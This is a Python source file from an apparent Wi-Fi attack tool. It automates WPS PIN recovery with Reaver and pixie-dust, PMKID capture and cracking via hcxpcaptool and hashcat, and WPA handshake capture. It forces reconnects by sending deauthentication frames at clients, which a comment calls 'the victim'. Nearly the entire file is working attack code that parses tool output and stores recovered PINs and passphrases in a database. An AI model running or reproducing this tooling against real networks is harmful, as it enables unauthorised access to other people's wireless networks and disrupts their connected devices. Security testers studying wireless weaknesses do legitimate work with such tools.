from wdcs.basicutils import *
from wdcs.logger import Logger
from timeit import default_timer as timer
from wdcs import timeutils
import sys
import traceback
import time
import string
import random


class CrackSuccess(Exception):
    pass


class CrackSuccessNoPsk(CrackSuccess):
    pass


class NoStations(Exception):
    pass


class WpsCracker(object):

    def __init__(self, config, file_manager, database):
        self.config = config
        self.file_manager = file_manager
        self.db = database

    def crack(self, ap, pixie):
        Logger.log("Starting Reaver (pixie={})...".format(pixie))
        wps_pin = None
        wpa_psk = None
        p = None
        try:
            session_file = "/usr/local/var/lib/reaver/{}.wpc".format(ap.bssid)
            if os.path.exists(session_file):
                os.remove(session_file)
            output_path = self.file_manager.filepath("reaver_{}_{}".format(ap.bssid, pixie))
            pixie_cmd_param = "-K" if pixie else ""
            p = Process.start_process_shell(
                "reaver -i {} -b {} -c {} {} -N -vv >{} 2>&1".format(
                    self.config.iface, Bssid.make_colon_bssid(ap.bssid),
                     ap.channel, pixie_cmd_param, output_path))
            start_time = timer()
            reaver_done = False
            total_count = 0
            deauth_counter = 0
            timeout_counter = 0
            rate_limiting_counter = 0
            while not reaver_done:
                time.sleep(1)
                with open(output_path) as rfile:
                    count = -1
                    for line in rfile:
                        count += 1
                        if count <= total_count:
                            continue
                        Logger.print_nolog(line.strip())
                        if not wps_pin and ("[+] WPS PIN:" in line or "[+] WPS pin:" in line):
                            Logger.log("Found PIN!")
                            try:
                                wps_pin = line.split(":")[1].strip()
                                if wpa_psk:
                                    reaver_done = True
                            except:
                                Logger.log("Cannot parse PIN: {}".format(line.strip()))
                                reaver_done = True
                        elif not wpa_psk and "[+] WPA PSK:" in line:
                            Logger.log("Found PSK!")
                            try:
                                wpa_psk = line.split("'")[1].strip()
                                if wps_pin:
                                    reaver_done = True
                            except:
                                Logger.log("Cannot parse PSK: {}".format(line.strip()))
                                reaver_done = True
                        elif "[+] Received deauth request" in line:
                            deauth_counter += 1
                            if deauth_counter == 5:
                                Logger.log("Too many deauths. Skipping...")
                                reaver_done = True
                        elif "[!] WARNING: Receive timeout occurred" in line:
                            timeout_counter += 1
                            if timeout_counter == 5:
                                Logger.log("Too many timeouts. Skipping...")
                                reaver_done = True
                        elif "[!] WARNING: Detected AP rate limiting" in line:
                            rate_limiting_counter += 1
                            if rate_limiting_counter == 2:
                                Logger.log("Rate limiting. Skipping...")
                                reaver_done = True
                        elif "[-] Pixiewps fail" in line:
                            Logger.log("Pixie failed")
                            reaver_done = True
                total_count = count
                if timer() - start_time > 600:
                    Logger.log("Reaver takes too long. Skipping...")
                    reaver_done = True
        except:
            Logger.log("Cannot crack with reaver! {}".format(traceback.format_exc()))
        finally:
            if p:
                p.kill()
            if wps_pin or wpa_psk:
                print("Reaver result: WPS PIN = {}, WPA PSK = {}".format(wps_pin, wpa_psk))
                ap.wps = wps_pin is not None
                ap.psk = wpa_psk is not None
                self.db.update_ap_wps(ap, wps_pin, wpa_psk)
                raise CrackSuccess()


class WpaCrackUtils(object):

    def __init__(self, file_manager, db, hashcat):
        self.db = db
        self.file_manager = file_manager
        self.hashcat = hashcat

    def extract_ap_station_communication_from_pcap(self, pcap_filename, ap_bssid_colon, station_bssid_colon):
        filtered_pcap = self.file_manager.filepath(
            "out_{}_{}.cap".format(Bssid.normalize_bssid(ap_bssid_colon), Bssid.normalize_bssid(station_bssid_colon)))
        ap_station_only_filter = "((wlan.da == {} and wlan.sa == {}) or (wlan.sa == {} and wlan.da == {}))".format(
            station_bssid_colon, ap_bssid_colon, station_bssid_colon, ap_bssid_colon)
        pt = Process.start_process_pipe_stdout(
            ["tshark", "-r", pcap_filename, "-Y", ap_station_only_filter, "-F", "libpcap", "-w", filtered_pcap])
        pt.wait()
        return filtered_pcap

    def read_and_crack_handshake(self, ap, pcap, airodump):
        file_4hs = self.__read_handshake(ap, pcap, airodump)
        if file_4hs:
            psk = self.hashcat.crack_4hs(file_4hs)
            if psk and len(psk) > 0:
                Logger.log("Found PSK: {}, AP: {}".format(psk, ap.essid))
                self.db.update_psk_for_bssid(ap.bssid, psk)
                ap.psk = True
                raise CrackSuccess
            else:
                raise CrackSuccessNoPsk

    def __read_handshake(self, ap, pcap, airodump=None):
        hs4_file = self.file_manager.filepath("4hs_{}".format(ap.bssid))
        pa = Process.start_process_pipe(["aircrack-ng", "-b", Bssid.make_colon_bssid(ap.bssid), "-j", hs4_file, pcap])
        time.sleep(2)
        if pa.poll() is not None:
            pa.kill()
        try:
            hs4_file_ext = "{}.hccapx".format(hs4_file)
            with open(hs4_file_ext, "rb") as f:
                data = f.read()
                if len(data) > 0:
                    if airodump:
                        airodump.kill()
                    Logger.log("Handshake collected ({} bytes in {})".format(
                            len(data), self.file_manager.filename(hs4_file_ext)))
                    self.db.update_ap_wpa_handshake(ap, data)
                    ap.hs4 = True
                    return hs4_file_ext
                else:
                    raise FileNotFoundError()
        except FileNotFoundError:
            Logger.log("WPA handshake not captured!")
        return None

    def read_tshark(self, filename, filter):
        pt = Process.start_process_pipe_stdout(["tshark", "-n", "-r", filename, "-Y", filter, "-T", "tabs"])
        messages = pt.communicate()[0].decode("utf-8")
        return messages.split("\n")

    def count_pmkid_messages(self, pcap_path):
        aps = {}
        lines = self.read_tshark(pcap_path, "eapol and wlan.rsn.ie.pmkid")
        for m in [m for m in lines if "Message 1" in m]:
            ap = Bssid.normalize_bssid(m.split("\t")[2])
            if ap not in aps:
                aps[ap] = 1
            else:
                aps[ap] += 1
        return aps

    def convert_and_crack_pcap_pmkid(self, ap, pcap_filepath):
        file_pmkid = self.__convert_pcap_pmkid(ap, pcap_filepath)
        if file_pmkid:
            out = self.hashcat.crack_pmkid(file_pmkid)
            if out and len(out) > 0:
                Logger.log("Found PSK: {}, AP: {}".format(out, ap.essid))
                self.db.update_psk_for_bssid(ap.bssid, out)
                ap.psk = True
                raise CrackSuccess
            else:
                raise CrackSuccessNoPsk

    def __convert_pcap_pmkid(self, ap, pcap_filename):
        pmkid_filename = self.file_manager.filepath("pmkid_{}.16800".format(ap.bssid))
        ph = Process.start_process_pipe(
            ["hcxpcaptool", "--filtermac", ap.bssid, "-k", pmkid_filename, pcap_filename])
        out = ph.communicate()[0].decode("utf-8")
        Logger.log(out)
        if "PMKID(s) written to" in out:
            with open(pmkid_filename, "r") as pmkid_file:
                pmkid = "".join(pmkid_file.readlines()).strip()
                if len(pmkid) > 0:
                    Logger.log("PMKID collected ({})".format(self.file_manager.filename(pmkid_filename)))
                    self.db.update_ap_pmkid(ap, pmkid)
                    ap.pmkid = True
                    return pmkid_filename
                else:
                    ap.pmkid = None
                    Logger.log("Problem with converting - empty PMKID")
        else:
            Logger.log("Problem with converting {}".format(self.file_manager.filename(pcap_filename)))
        return None


class WpaPmkidCracker(object):

    def __init__(self, file_manager, crack_utils, config):
        self.file_manager = file_manager
        self.crack_utils = crack_utils
        self.config = config

    def crack_wpa_pmkid(self, ap):
        Logger.log("Trying to get PMKID...")
        pw = None
        airodump = None
        try:
            airodump = AirodumpProcess(self.config.iface, self.file_manager, ap)
            rnd_password = "".join(random.sample(string.ascii_letters,8)) #value doesnt matter
            pw = WpaSupplicant.connect_wpa(ap, rnd_password, self.config, self.file_manager, second_iface=True)
            time.sleep(5)
            tries = 6
            while tries > 0:
                tries -= 1
                time.sleep(30)
                messages_count = self.crack_utils.count_pmkid_messages(airodump.pcap_filepath)
                if len(messages_count) < 1 or ap.bssid not in messages_count:
                    continue
                messages_count = messages_count[ap.bssid]
                Logger.log("Gathered {} M1 messages".format(messages_count))
                if messages_count > 0:
                    tries = 0
                    Logger.log("Convert pcap")
                    self.crack_utils.convert_and_crack_pcap_pmkid(ap, airodump.pcap_filepath)
        except CrackSuccess as e:
            raise e
        except:
            Logger.log("Cannot find PMKID! {}".format(traceback.format_exc()))
        finally:
            if airodump:
                airodump.kill()
            if pw:
                pw.kill()


class WpaHandshakeCracker(object):

    def __init__(self, config, crack_utils, file_manager):
        self.config = config
        self.crack_utils = crack_utils
        self.file_manager = file_manager

    def crack_wpa_handshake(self, ap, stations, deauth=False):
        Logger.log("Trying to get WPA handshake")
        airodump = None
        try:
            if len(stations) == 0:
                raise NoStations()
            airodump = AirodumpProcess(self.config.iface, self.file_manager, ap)
            tries = 0
            tries_limit = (len(stations) * self.config.TRIES_PER_STATION) if deauth else self.config.TRIES_LIMIT_NO_DEAUTH
            Logger.log("tries limit {}".format(tries_limit))
            while tries < tries_limit:
                if deauth:
                    station = stations[int(tries / self.config.TRIES_PER_STATION)]
                    station_try = ((tries % self.config.TRIES_PER_STATION) + 1)
                    Logger.log("Start deauth AP: {}, Station: {}".format(ap.bssid, station))
                    deauth_count = self.config.DEAUTH_COUNT_BASE * station_try
                    ap_bssid_colon = Bssid.make_colon_bssid(ap.bssid)
                    station_bssid_colon = Bssid.make_colon_bssid(station)
                    pd = Process.start_process_devnull(
                        ["aireplay-ng", "--deauth", str(deauth_count), "-a", ap_bssid_colon, "-c", station_bssid_colon,
                         self.config.iface])
                    pd.wait()
                    Logger.log("Stop deauth")
                    time.sleep(self.config.SLEEP_AFTER_DEAUTH_BASE * station_try)  # let give the victim time for reconnect
                pt = Process.start_process_pipe_stdout(["tshark", "-r", airodump.pcap_filepath, "-Y",
                                                 "eapol and (wlan.sa == {} or wlan.da == {})".format(
                                                     Bssid.make_colon_bssid(ap.bssid),
                                                     Bssid.make_colon_bssid(ap.bssid))])
                out = pt.communicate()[0].decode("utf-8")
                if ("(Message 1 of 4)" in out or "(Message 3 of 4)" in out) and "(Message 2 of 4)" in out:
                    Logger.log("EAPOL messages gathered.")
                    pcap = airodump.pcap_filepath
                    if deauth:
                        pcap = self.crack_utils.extract_ap_station_communication_from_pcap(
                            airodump.pcap_filepath, ap_bssid_colon, station_bssid_colon)
                    self.crack_utils.read_and_crack_handshake(ap, pcap, airodump)
                else:
                    Logger.log("No EAPOL messages yet...")
                if not deauth:
                    time.sleep(self.config.SLEEP_NO_DEAUTH)
                tries += 1
        except CrackSuccess as e:
            raise e
        except NoStations as e:
            raise e
        except:
            Logger.log("Cannot get WPA handshake! {}".format(traceback.format_exc()))
        finally:
            if airodump:
                airodump.kill()
